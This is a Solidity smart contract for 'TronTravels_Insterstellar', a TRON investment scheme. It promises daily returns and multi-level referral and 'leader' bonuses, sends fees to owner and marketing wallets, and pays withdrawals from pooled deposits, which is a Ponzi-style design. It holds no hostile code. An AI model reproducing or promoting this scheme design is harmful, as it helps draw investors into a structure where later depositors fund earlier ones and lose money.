//SourceUnit: TronTravels_Insterstellar.sol

/*! TronTravels_Insterstellar.sol | 2020 by S&S  */

pragma solidity 0.5.10;

contract TronTravels_Insterstellar {
    using SafeMath for uint;

    uint8  constant private MAX_PROFIT = 2;
    uint8  constant private DEPOSITS_MAX_COUNT = 100;
    uint32 constant private INVEST_MIN_AMOUNT = 15E7;
    uint16 constant private OWNER_FEE = 3500;
    uint16 constant private MARKETING_FEE = 3500;
    uint16 constant private DEVELOPER_FEE = 3000;
    uint16 constant private BASIC_ROI = 1000;
    uint16 constant private REINVEST_BONUS_STEP = 300;
    uint16 constant private REINVEST_BONUS_MAX = 3000;
    uint8  constant private HOLD_BONUS_STEP = 50;
    uint16 constant private HOLD_BONUS_MAX = 500;
    uint8  constant private CONTRACT_BONUS_STEP = 25;
    uint16 constant private CONTRACT_BONUS_MAX = 500;
    uint32 constant private DIVIDER = 100000;
    uint64 constant private CONTRACT_BALANCE_STEP = 1E12;
    uint64 constant private TIME_STEP = 1 days;
    uint64 constant private CONTRACT_PRE_LAUNCH_DAYS = 313200; // 3 days and 15 hours

    //Compensation - Old TronTravels Contract Address
    address public TronTravelsAddress;

    address payable private Owner;
    address payable private Developer;
    address payable private Marketing;

    uint16[]  private REFERRALS = [5000,3000,1000];
    uint16[]  private REFERRALS_RATIO = [100,50,25];
    string[]  private LEADER_TITLE;
    uint[3][] private LEADER_BONUS;

    uint private totalInvested;
    uint private totalReinvest;
    uint private totalWithdrawn;
    uint private totalUsers;
    uint private CONTRACT_LAUNCH_DATE;
    uint private CONTRACT_BONUS;
    uint public  totalCompensation;
 
    struct Deposit {
        uint   amount;
        uint   withdrawn;
        uint64 date;
    }

    struct User {
        Deposit[] deposits;
        uint32    checkPoint;
        uint32    holdPoint;
        address   referrer;
        uint16    depositCnt;
        uint16    reinvestBonus;
        uint16    reinvestCnt;
        int8      leaderId;
        uint      leaderTurnover;
        uint64[3] refs;
        uint      totalInvested;
        uint      totalReinvest;
        uint      totalWithdrawn;
        uint      totalReferrals;
        bool      compensationStatus;
    }

    mapping (address => User) internal users;

    event NewDeposit(address indexed user, uint amount);
    event Reinvest(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event Compensation(address indexed user, uint amount);
    event Newbie(address user);

    constructor(address payable developerAddr, address payable ownerAddr, address payable marketingAddr, address tronTravelsAddr) public {
        require(!isContract(developerAddr) && !isContract(ownerAddr));
        Owner = ownerAddr;
        Developer = developerAddr;
        Marketing = marketingAddr;
        TronTravelsAddress = tronTravelsAddr;
        CONTRACT_LAUNCH_DATE = block.timestamp + CONTRACT_PRE_LAUNCH_DAYS;
        CONTRACT_BONUS = 0;
        _init();
    }

    function _init() private {
        LEADER_BONUS.push([0,0,0]);
        LEADER_BONUS.push([1E10,2E8,100]);
        LEADER_BONUS.push([2E10,4E8,300]);
        LEADER_BONUS.push([5E10,1E9,500]);
        LEADER_BONUS.push([1E11,2E9,700]);
        LEADER_BONUS.push([5E11,1E10,1000]);
        LEADER_BONUS.push([1E12,35E9,1300]);
        LEADER_BONUS.push([5E12,13E10,1500]);
        LEADER_TITLE.push('N/A');
        LEADER_TITLE.push('Newbie');
        LEADER_TITLE.push('Pro Traveller');
        LEADER_TITLE.push('Leader');
        LEADER_TITLE.push('Pro leader');
        LEADER_TITLE.push('Vice director');
        LEADER_TITLE.push('Director');
        LEADER_TITLE.push('Grand Director');
    }

    function setReferrer(address _addr, address _referrer, uint256 _amount) private {
        if(users[_addr].referrer == address(0) && users[_referrer].depositCnt>0 && _addr != Owner && _referrer != address(0)) {
            users[_addr].referrer = _referrer;
        }

        if(users[_addr].referrer != address(0)){
            address ref = users[_addr].referrer;
            uint refAmount;
            for(uint8 i = 0; i < REFERRALS.length; i++) {
                refAmount = _amount.mul(REFERRALS[i]).div(DIVIDER);
                address(uint160(ref)).transfer(refAmount);
                users[ref].totalReferrals = users[ref].totalReferrals.add(refAmount);
                users[ref].refs[i]++;
                updateLeaderBonus(ref,_amount,i);
                ref = users[ref].referrer;
                if(ref == address(0)) break;
            }
        }
    }

    function invest(address referrer) external payable {
        require(block.timestamp >= CONTRACT_LAUNCH_DATE, "Deposits Are Not Available Yet");
        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum Invest Amount 150 TRX");
        User storage user = users[msg.sender];
        require(user.deposits.length < DEPOSITS_MAX_COUNT, "Maximum 100 Deposits From a Unique Address");

        uint _amount = msg.value;
        setReferrer(msg.sender,referrer,_amount);

        Owner.transfer(_amount.mul(OWNER_FEE).div(DIVIDER));
        Developer.transfer(_amount.mul(DEVELOPER_FEE).div(DIVIDER));
        Marketing.transfer(_amount.mul(MARKETING_FEE).div(DIVIDER));

        if (user.deposits.length == 0) {
            totalUsers++;
            user.checkPoint = uint32(block.timestamp);
            user.holdPoint = uint32(block.timestamp);
            user.reinvestBonus=0;
            user.leaderTurnover=0;
            user.leaderId=0;
            user.compensationStatus = false;
            emit Newbie(msg.sender);
        }
        else{
            // Reset Hold Bonus Of Inactive User
            if(!isActive(msg.sender)){
                user.checkPoint = uint32(block.timestamp);
            }
        }


        user.deposits.push(Deposit(uint(_amount), 0, uint32(block.timestamp)));

        user.totalInvested = user.totalInvested.add(_amount);
        user.depositCnt++;
        totalInvested = totalInvested.add(_amount);

        updateContractBonus();
        emit NewDeposit(msg.sender, _amount);
    }

    function reinvest() external {
        User storage user = users[msg.sender];
        require(user.deposits.length > 0, "at least one deposit");
        uint available = getTotalDividends(msg.sender);
        require(available >= (user.totalInvested.add(user.totalReinvest)).div(10),"Available dividens is less than 10% of total invested");
        require(user.deposits.length < DEPOSITS_MAX_COUNT, "Maximum 100 Deposits From a Unique Address");

        uint256 val;
		uint256 reinvestAmount;

        for(uint i = 0; i < user.deposits.length; i++) {
            val = getDepositDividends(msg.sender,i);
            user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(val);
            reinvestAmount = reinvestAmount.add(val);
        }

        user.deposits.push(Deposit(uint(reinvestAmount), 0, uint32(block.timestamp)));
        user.reinvestCnt++;
        if(user.reinvestBonus < REINVEST_BONUS_MAX ){
            user.reinvestBonus = uint16(uint(user.reinvestCnt).mul(REINVEST_BONUS_STEP));
        }
        user.totalReinvest = user.totalReinvest.add(reinvestAmount);
        user.depositCnt++;
        totalReinvest = totalReinvest.add(reinvestAmount);

        user.checkPoint = uint32(block.timestamp);
        
        emit Reinvest(msg.sender, reinvestAmount);
    }

    function withdraw() external {
        User storage user = users[msg.sender];
        
        uint256 val;
		uint256 totalAmount;

        for(uint i = 0; i < user.deposits.length; i++) {
            val = getDepositDividends(msg.sender,i);
            user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(val);
            totalAmount = totalAmount.add(val);
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = getContractBalance();
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkPoint = uint32(block.timestamp);
        user.holdPoint  = uint32(block.timestamp);
        user.totalWithdrawn = user.totalWithdrawn.add(totalAmount);

        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
        
    }

    function getTotalDividends(address addr) public view returns (uint) {
        User storage user = users[addr];

        uint dividends;
        uint totalAmount;

        for(uint i = 0; i < user.deposits.length; i++) {
            dividends = getDepositDividends(addr,i);
            totalAmount = totalAmount.add(dividends);
        }

        return totalAmount;
    }

    function getDepositDividends(address addr, uint i) public view returns (uint) {
        User storage user = users[addr];

        uint userBonus = getUserBonus(addr);

        uint dividends;

        if(user.deposits[i].withdrawn < user.deposits[i].amount.mul(MAX_PROFIT)) {

            if (user.deposits[i].date > user.checkPoint) {

                dividends = (user.deposits[i].amount.mul(userBonus).div(DIVIDER))
                    .mul(block.timestamp.sub(user.deposits[i].date))
                    .div(TIME_STEP);
            } else {

                dividends = (user.deposits[i].amount.mul(userBonus).div(DIVIDER))
                    .mul(block.timestamp.sub(user.checkPoint))
                    .div(TIME_STEP);
            }

            if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(MAX_PROFIT)) {
                dividends = (user.deposits[i].amount.mul(MAX_PROFIT)).sub(user.deposits[i].withdrawn);
            }
        }
        else{
            dividends = 0;
        }
        
        return dividends;
    }

    function getUserBonus(address addr) public view returns (uint) {
        User storage user = users[addr];

        uint Bonus = BASIC_ROI;

        if (isActive(addr)) {
            uint holdBonus = getHoldBonus(addr);

            Bonus = uint(BASIC_ROI).add(holdBonus).add(user.reinvestBonus).add(CONTRACT_BONUS);
            if(user.leaderId >= 0){
                Bonus = Bonus.add(LEADER_BONUS[uint8(user.leaderId)][2]);
            }

        }
        
        return Bonus;
    }

    function getHoldBonus(address addr) public view returns (uint) {
        User storage user = users[addr];

        if (isActive(addr)) {
            uint holdTime = (block.timestamp.sub(uint(user.holdPoint))).div(TIME_STEP).mul(HOLD_BONUS_STEP);
            if (holdTime > HOLD_BONUS_MAX) {
                holdTime = HOLD_BONUS_MAX;
            }
            return holdTime;
        } else {
            return 0;
        }
    }

    function updateContractBonus() private {
        uint contractBalance = getContractBalance();
        uint contractBonus;
        if(CONTRACT_BONUS < CONTRACT_BONUS_MAX){
            contractBonus = contractBalance.div(CONTRACT_BALANCE_STEP).mul(CONTRACT_BONUS_STEP);
            if(contractBonus > CONTRACT_BONUS)
            {
                if(contractBonus >= CONTRACT_BONUS_MAX)
                {
                    CONTRACT_BONUS = CONTRACT_BONUS_MAX;
                }
                else{
                    CONTRACT_BONUS =contractBonus;
                }
            }

        }
    }

    function updateLeaderBonus(address addr , uint _amount, uint8 i) private {
        uint amount =  _amount.mul(REFERRALS_RATIO[i]).div(100);
        users[addr].leaderTurnover += amount;
        int8 leaderId=0;
        for(uint8 j = 0; j < LEADER_BONUS.length; j++) {
            if(users[addr].leaderTurnover >= LEADER_BONUS[j][0] ){
                leaderId = int8(j);
            }
            else break;
        }

        if(users[addr].leaderId < leaderId){
            for(int8 k = (users[addr].leaderId+1); k <= leaderId; k++ ){
                address(uint160(addr)).transfer(LEADER_BONUS[uint8(k)][1]);
            }
            users[addr].leaderId = leaderId;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getUserDeposits(address addr) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[addr];

        uint cnt = user.deposits.length;

        uint[] memory amount = new uint[](cnt);
        uint[] memory withdrawn = new uint[](cnt);
        uint[] memory date = new uint[](cnt);

        for (uint i = 0; i < cnt; i++) {
            amount[i] = uint(user.deposits[i].amount);
            withdrawn[i] = uint(user.deposits[i].withdrawn);
            date[i] = uint(user.deposits[i].date);
        }

        return (amount, withdrawn, date);
    }

    function getUserInfo(address addr) public view returns (uint, uint, uint, uint, uint, uint, uint, uint, uint) {
        User storage user = users[addr];

        return (
            uint(user.totalInvested),
            uint(user.totalReinvest),
            uint(user.depositCnt),
            uint(user.totalWithdrawn),
            getTotalDividends(addr),
            uint(user.totalReferrals),
            uint(user.refs[0]),
            uint(user.refs[1]),
            uint(user.refs[2])
        );
    }

    function getUserInfoBonus(address addr) public view returns (uint, uint, uint, uint,uint, string memory) {
        User storage user = users[addr];

        string memory title = "";
        uint leaderBonus = 0;
        if(user.leaderId >= 0 && user.leaderTurnover >= LEADER_BONUS[0][0]){
            title = LEADER_TITLE[uint(user.leaderId)];
            leaderBonus = LEADER_BONUS[uint(user.leaderId)][2];
        }

        return (
            uint(user.reinvestCnt),
            uint(user.leaderTurnover),
            uint(user.reinvestBonus),
            uint(getHoldBonus(addr)),
            uint(leaderBonus),
            title
        );
    }

    function getUserInfoPoint(address addr) public view returns (uint, uint, address) {
        User storage user = users[addr];
        return (
            uint(user.holdPoint),
            uint(user.checkPoint),
            user.referrer
        );
    }

    function getContractInfo() public view returns (uint,uint, uint, uint, uint, uint, uint) {
        return (totalInvested,totalReinvest,totalWithdrawn,totalUsers,CONTRACT_LAUNCH_DATE, address(this).balance, CONTRACT_BONUS);
    }

    function withdrawCompensation() external {
        User storage user = users[msg.sender];

        uint compensationAmount=0;
        if(user.deposits.length > 0){
            uint firstDeposit = user.deposits[0].amount;

            TronTravels oldContract = TronTravels(TronTravelsAddress);
            (,uint256 invested, uint256 withdrawn,,) = oldContract.userInfo(msg.sender);
            uint lostAmount = invested.sub(withdrawn);

            if(firstDeposit > 0 && lostAmount > 0){
                compensationAmount = firstDeposit.div(10);
                if(compensationAmount > lostAmount){
                    compensationAmount = lostAmount;
                }
            }
        }

        require(compensationAmount > 0 ,"User has no Compensation");
        require(user.compensationStatus == false ,"Compensation has paid");

        msg.sender.transfer(compensationAmount);
        user.compensationStatus=true;
        totalCompensation = totalCompensation.add(compensationAmount);

        emit Compensation(msg.sender, compensationAmount);
    }

    function getCompensationStats(address addr) public view returns (uint,uint,uint,uint,uint,bool) {
        User storage user = users[addr];
        uint firstDeposit = 0;
        uint lostAmount = 0;
        uint compensationAmount = 0;
        if(user.deposits.length > 0){
            firstDeposit = user.deposits[0].amount;
        }

        TronTravels oldContract = TronTravels(TronTravelsAddress);
        (, uint256 invested, uint256 withdrawn, , ) = oldContract.userInfo(addr);

        lostAmount = invested.sub(withdrawn);

        if(firstDeposit > 0 && lostAmount > 0){
            compensationAmount = firstDeposit.div(10);
            if(compensationAmount > lostAmount){
                compensationAmount = lostAmount;
            }
        }

        return (firstDeposit,invested,withdrawn,lostAmount,compensationAmount,user.compensationStatus);
    }

    function isActive(address addr) public view returns (bool) {
        User storage user = users[addr];

        return (user.deposits.length > 0) && user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(MAX_PROFIT);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

// UserInfo Interface - Old TronTravels 
contract TronTravels{
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}